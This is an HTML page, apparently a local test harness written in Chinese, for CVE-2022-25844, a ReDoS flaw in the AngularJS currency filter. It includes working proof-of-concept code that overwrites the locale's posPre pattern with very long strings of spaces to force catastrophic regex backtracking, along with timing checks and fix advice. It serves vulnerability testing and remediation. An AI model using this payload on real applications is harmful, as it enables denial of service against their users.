<!DOCTYPE html>
<html ng-app="testApp">
<head>
    <meta charset="UTF-8">
    <title>CVE-2022-25844 AngularJS $locale ReDoS 測試頁面</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .container {
            background: #f5f5f5;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .vulnerability-info {
            background: #ffebcd;
            border: 2px solid #daa520;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
        .test-section {
            background: #e6f3ff;
            border: 1px solid #0066cc;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        .attack-button {
            background: #ff4444;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .attack-button:hover {
            background: #cc0000;
        }
        .safe-button {
            background: #44aa44;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        .safe-button:hover {
            background: #006600;
        }
        .result {
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
        }
        .timing {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
        }
        .vulnerable {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
        }
        .safe {
            background: #d4edda;
            border: 1px solid #c3e6cb;
        }
        .status {
            font-weight: bold;
            margin: 10px 0;
        }
        .code-block {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            padding: 10px;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
            overflow-x: auto;
        }
        .warning {
            color: #856404;
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
    </style>
</head>
<body ng-controller="TestController">
    
    <h1>CVE-2022-25844 AngularJS $locale ReDoS 弱點測試</h1>
    
    <div class="vulnerability-info">
        <h3>⚠️ 弱點資訊</h3>
        <p><strong>CVE ID:</strong> CVE-2022-25844</p>
        <p><strong>CVSS 評分:</strong> 7.5 (High)</p>
        <p><strong>影響版本:</strong> AngularJS >= 1.7.0</p>
        <p><strong>弱點類型:</strong> Regular Expression Denial of Service (ReDoS)</p>
        <p><strong>攻擊向量:</strong> 通過覆寫 $locale.NUMBER_FORMATS.PATTERNS[1].posPre 為超長字串，在執行 currency 過濾器時觸發正規表達式災難性回溯</p>
    </div>
    
    <div class="container">
        <h3>🔍 當前環境資訊</h3>
        <div class="status">
            <p>AngularJS 版本: <span class="code-block">{{angularVersion}}</span></p>
            <p>瀏覽器: <span class="code-block">{{userAgent}}</span></p>
            <p>當前 $locale.id: <span class="code-block">{{currentLocale}}</span></p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>🧪 基本功能測試</h3>
        <p>正常的 currency 過濾器測試：</p>
        <div class="result safe">
            <p>正數: {{ 100 | currency : '$' }} (正常格式化)</p>
            <p>負數: {{ -100 | currency : '$' }} (使用 PATTERNS[1])</p>
            <p>空符號: {{ -100 | currency : '' }} (空字串符號，CVE-2022-25844 觸發條件)</p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>🎯 CVE-2022-25844 攻擊測試</h3>
        
        <div class="warning">
            <strong>警告:</strong> 以下測試會故意觸發 ReDoS 攻擊，可能導致瀏覽器暫時無響應。請在測試環境中執行。
        </div>
        
        <h4>測試 1: 中等強度 ReDoS (10,000 字符)</h4>
        <button class="attack-button" ng-click="testReDoS(10000)" ng-disabled="testing">
            執行 10K ReDoS 測試
        </button>
        <div class="result timing" ng-if="results.test10k">
            <p>執行時間: <strong>{{results.test10k.duration}}ms</strong></p>
            <p>狀態: <span ng-class="results.test10k.vulnerable ? 'vulnerable' : 'safe'">
                {{results.test10k.vulnerable ? '⚠️ 可能存在弱點' : '✅ 未檢測到異常'}}
            </span></p>
            <p>結果: {{results.test10k.result}}</p>
        </div>
        
        <h4>測試 2: 高強度 ReDoS (50,000 字符)</h4>
        <button class="attack-button" ng-click="testReDoS(50000)" ng-disabled="testing">
            執行 50K ReDoS 測試
        </button>
        <div class="result timing" ng-if="results.test50k">
            <p>執行時間: <strong>{{results.test50k.duration}}ms</strong></p>
            <p>狀態: <span ng-class="results.test50k.vulnerable ? 'vulnerable' : 'safe'">
                {{results.test50k.vulnerable ? '⚠️ 可能存在弱點' : '✅ 未檢測到異常'}}
            </span></p>
            <p>結果: {{results.test50k.result}}</p>
        </div>
        
        <h4>測試 3: 極限強度 ReDoS (100,000 字符)</h4>
        <button class="attack-button" ng-click="testReDoS(100000)" ng-disabled="testing">
            執行 100K ReDoS 測試 (危險)
        </button>
        <div class="result timing" ng-if="results.test100k">
            <p>執行時間: <strong>{{results.test100k.duration}}ms</strong></p>
            <p>狀態: <span ng-class="results.test100k.vulnerable ? 'vulnerable' : 'safe'">
                {{results.test100k.vulnerable ? '⚠️ 可能存在弱點' : '✅ 未檢測到異常'}}
            </span></p>
            <p>結果: {{results.test100k.result}}</p>
        </div>
        
        <div class="result" ng-if="testing">
            <p>🔄 測試進行中，請稍候...</p>
            <p>⏱️ 已執行時間: {{testingTime}}ms</p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>🔧 手動測試區域</h3>
        <p>自訂 posPre 長度測試：</p>
        <label>posPre 字符數: </label>
        <input type="number" ng-model="customLength" min="1000" max="200000" value="20000">
        <br><br>
        <label>測試數值: </label>
        <input type="number" ng-model="customValue" value="-100">
        <br><br>
        <button class="attack-button" ng-click="testCustomReDoS()" ng-disabled="testing">
            執行自訂 ReDoS 測試
        </button>
        <div class="result timing" ng-if="results.custom">
            <p>posPre 長度: {{results.custom.length}} 字符</p>
            <p>執行時間: <strong>{{results.custom.duration}}ms</strong></p>
            <p>狀態: <span ng-class="results.custom.vulnerable ? 'vulnerable' : 'safe'">
                {{results.custom.vulnerable ? '⚠️ 檢測到 ReDoS' : '✅ 未檢測到異常'}}
            </span></p>
            <p>結果: {{results.custom.result}}</p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>📊 $locale 狀態檢查</h3>
        <button class="safe-button" ng-click="checkLocaleStatus()">檢查當前 $locale 狀態</button>
        <div class="result" ng-if="localeStatus">
            <h4>$locale.NUMBER_FORMATS 內容:</h4>
            <div class="code-block">
                <pre>{{localeStatus | json}}</pre>
            </div>
        </div>
        
        <button class="attack-button" ng-click="injectMaliciousLocale()">
            注入惡意 $locale 設定
        </button>
        <div class="result" ng-if="localeInjected">
            <p ng-if="localeInjected.success" class="vulnerable">
                ✅ 成功注入惡意 $locale 設定！PATTERNS[1].posPre 已被覆寫為 {{localeInjected.length}} 字符
            </p>
            <p ng-if="!localeInjected.success" class="safe">
                ❌ $locale 注入失敗或被保護
            </p>
        </div>
    </div>
    
    <div class="test-section">
        <h3>🔬 即時 currency 過濾器測試</h3>
        <p>當前被污染的 $locale 即時測試:</p>
        <div class="result" ng-if="localeInjected && localeInjected.success">
            <p>⚠️ 警告: $locale 已被污染，以下測試可能導致瀏覽器卡死</p>
            <button class="attack-button" ng-click="testPollutedCurrency()">
                測試被污染的 currency 過濾器
            </button>
            <div ng-if="pollutedResult">
                <p>執行時間: <strong>{{pollutedResult.duration}}ms</strong></p>
                <p>結果: {{pollutedResult.result}}</p>
                <p ng-if="pollutedResult.vulnerable" class="vulnerable">
                    🚨 確認存在 CVE-2022-25844 ReDoS 弱點！
                </p>
            </div>
        </div>
    </div>
    
    <div class="container">
        <h3>📋 測試總結</h3>
        <div class="result" ng-if="summary">
            <h4>弱點檢測摘要:</h4>
            <ul>
                <li>總測試次數: {{summary.totalTests}}</li>
                <li>發現弱點: {{summary.vulnerableTests}}</li>
                <li>最長執行時間: {{summary.maxDuration}}ms</li>
                <li>平均執行時間: {{summary.avgDuration}}ms</li>
                <li ng-if="summary.vulnerable" class="vulnerable">
                    🚨 <strong>結論: 確認存在 CVE-2022-25844 弱點</strong>
                </li>
                <li ng-if="!summary.vulnerable" class="safe">
                    ✅ <strong>結論: 未檢測到明確的 ReDoS 弱點</strong>
                </li>
            </ul>
        </div>
        
        <button class="safe-button" ng-click="generateReport()">
            生成詳細報告
        </button>
        
        <div class="result" ng-if="detailedReport">
            <h4>詳細報告:</h4>
            <div class="code-block">
                <pre>{{detailedReport}}</pre>
            </div>
        </div>
    </div>
    
    <div class="vulnerability-info">
        <h3>🛡️ 修復建議</h3>
        <ol>
            <li><strong>立即更新:</strong> 升級到 AngularJS NES 1.8.8+ 或遷移到現代框架</li>
            <li><strong>輸入驗證:</strong> 限制 $locale 設定的使用者控制性</li>
            <li><strong>長度限制:</strong> 對 NUMBER_FORMATS.PATTERNS 的字串長度實施限制</li>
            <li><strong>監控防護:</strong> 實施前端效能監控，檢測異常的 CPU 使用</li>
            <li><strong>CSP 政策:</strong> 實施嚴格的內容安全政策防止惡意腳本注入</li>
        </ol>
    </div>

    <script>
        angular.module('testApp', [])
        .controller('TestController', ['$scope', '$locale', '$filter', '$timeout', function($scope, $locale, $filter, $timeout) {
            // 初始化
            $scope.angularVersion = angular.version.full;
            $scope.userAgent = navigator.userAgent;
            $scope.currentLocale = $locale.id;
            $scope.results = {};
            $scope.testing = false;
            $scope.testingTime = 0;
            $scope.customLength = 20000;
            $scope.customValue = -100;
            
            var originalLocale = angular.copy($locale.NUMBER_FORMATS);
            var testResults = [];
            
            // ReDoS 測試函數
            $scope.testReDoS = function(length) {
                var testName = 'test' + (length / 1000) + 'k';
                $scope.testing = true;
                $scope.testingTime = 0;
                
                // 開始計時器
                var startTime = Date.now();
                var timer = setInterval(function() {
                    $scope.testingTime = Date.now() - startTime;
                    $scope.$apply();
                }, 100);
                
                // 使用 $timeout 避免阻塞 UI
                $timeout(function() {
                    try {
                        // 1. 備份原始 locale
                        var backup = angular.copy($locale.NUMBER_FORMATS);
                        
                        // 2. 注入惡意 posPre
                        var maliciousPosPre = ' '.repeat(length);
                        $locale.NUMBER_FORMATS.PATTERNS[1].posPre = maliciousPosPre;
                        
                        // 3. 測試 currency 過濾器 (觸發 ReDoS)
                        var testStart = performance.now();
                        var result = $filter('currency')(-100, ''); // 負數 + 空符號觸發 PATTERNS[1]
                        var testEnd = performance.now();
                        
                        var duration = Math.round(testEnd - testStart);
                        var isVulnerable = duration > 1000; // 超過 1 秒認為可能存在 ReDoS
                        
                        $scope.results[testName] = {
                            duration: duration,
                            vulnerable: isVulnerable,
                            result: result,
                            length: length
                        };
                        
                        // 記錄測試結果
                        testResults.push({
                            name: testName,
                            length: length,
                            duration: duration,
                            vulnerable: isVulnerable
                        });
                        
                        // 4. 恢復原始 locale
                        $locale.NUMBER_FORMATS = backup;
                        
                    } catch (error) {
                        $scope.results[testName] = {
                            duration: 'ERROR',
                            vulnerable: true,
                            result: 'Test failed: ' + error.message,
                            length: length
                        };
                    } finally {
                        clearInterval(timer);
                        $scope.testing = false;
                        $scope.updateSummary();
                    }
                }, 50);
            };
            
            // 自訂 ReDoS 測試
            $scope.testCustomReDoS = function() {
                var length = parseInt($scope.customLength) || 20000;
                var value = parseInt($scope.customValue) || -100;
                
                $scope.testing = true;
                
                $timeout(function() {
                    try {
                        var backup = angular.copy($locale.NUMBER_FORMATS);
                        var maliciousPosPre = ' '.repeat(length);
                        $locale.NUMBER_FORMATS.PATTERNS[1].posPre = maliciousPosPre;
                        
                        var testStart = performance.now();
                        var result = $filter('currency')(value, '');
                        var testEnd = performance.now();
                        
                        var duration = Math.round(testEnd - testStart);
                        var isVulnerable = duration > 500;
                        
                        $scope.results.custom = {
                            duration: duration,
                            vulnerable: isVulnerable,
                            result: result,
                            length: length
                        };
                        
                        testResults.push({
                            name: 'custom',
                            length: length,
                            duration: duration,
                            vulnerable: isVulnerable
                        });
                        
                        $locale.NUMBER_FORMATS = backup;
                        
                    } catch (error) {
                        $scope.results.custom = {
                            duration: 'ERROR',
                            vulnerable: true,
                            result: 'Test failed: ' + error.message,
                            length: length
                        };
                    } finally {
                        $scope.testing = false;
                        $scope.updateSummary();
                    }
                }, 50);
            };
            
            // 檢查 $locale 狀態
            $scope.checkLocaleStatus = function() {
                $scope.localeStatus = {
                    CURRENCY_SYM: $locale.NUMBER_FORMATS.CURRENCY_SYM,
                    DECIMAL_SEP: $locale.NUMBER_FORMATS.DECIMAL_SEP,
                    GROUP_SEP: $locale.NUMBER_FORMATS.GROUP_SEP,
                    PATTERNS: $locale.NUMBER_FORMATS.PATTERNS
                };
            };
            
            // 注入惡意 $locale 設定
            $scope.injectMaliciousLocale = function() {
                try {
                    var maliciousLength = 50000;
                    var maliciousPosPre = ' '.repeat(maliciousLength);
                    
                    // 嘗試覆寫 $locale
                    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = maliciousPosPre;
                    
                    // 驗證是否成功
                    var currentPosPre = $locale.NUMBER_FORMATS.PATTERNS[1].posPre;
                    var success = currentPosPre.length === maliciousLength;
                    
                    $scope.localeInjected = {
                        success: success,
                        length: currentPosPre.length
                    };
                    
                } catch (error) {
                    $scope.localeInjected = {
                        success: false,
                        error: error.message
                    };
                }
            };
            
            // 測試被污染的 currency 過濾器
            $scope.testPollutedCurrency = function() {
                try {
                    var testStart = performance.now();
                    var result = $filter('currency')(-100, '');
                    var testEnd = performance.now();
                    
                    var duration = Math.round(testEnd - testStart);
                    
                    $scope.pollutedResult = {
                        duration: duration,
                        result: result,
                        vulnerable: duration > 1000
                    };
                    
                } catch (error) {
                    $scope.pollutedResult = {
                        duration: 'ERROR',
                        result: 'Test failed: ' + error.message,
                        vulnerable: true
                    };
                }
            };
            
            // 更新測試總結
            $scope.updateSummary = function() {
                if (testResults.length === 0) return;
                
                var totalTests = testResults.length;
                var vulnerableTests = testResults.filter(r => r.vulnerable).length;
                var durations = testResults.map(r => r.duration).filter(d => typeof d === 'number');
                var maxDuration = Math.max(...durations);
                var avgDuration = Math.round(durations.reduce((a, b) => a + b, 0) / durations.length);
                
                $scope.summary = {
                    totalTests: totalTests,
                    vulnerableTests: vulnerableTests,
                    maxDuration: maxDuration,
                    avgDuration: avgDuration,
                    vulnerable: vulnerableTests > 0
                };
            };
            
            // 生成詳細報告
            $scope.generateReport = function() {
                var report = {
                    timestamp: new Date().toISOString(),
                    environment: {
                        angularVersion: $scope.angularVersion,
                        userAgent: $scope.userAgent,
                        locale: $scope.currentLocale
                    },
                    vulnerability: 'CVE-2022-25844',
                    description: 'AngularJS $locale NUMBER_FORMATS ReDoS',
                    testResults: testResults,
                    summary: $scope.summary,
                    recommendation: $scope.summary && $scope.summary.vulnerable ? 
                        'VULNERABLE: Update to AngularJS NES 1.8.8+ immediately' :
                        'No clear ReDoS vulnerability detected, but recommend updating for security'
                };
                
                $scope.detailedReport = JSON.stringify(report, null, 2);
            };
            
            // 初始檢查
            $scope.checkLocaleStatus();
        }]);
    </script>
</body>
</html>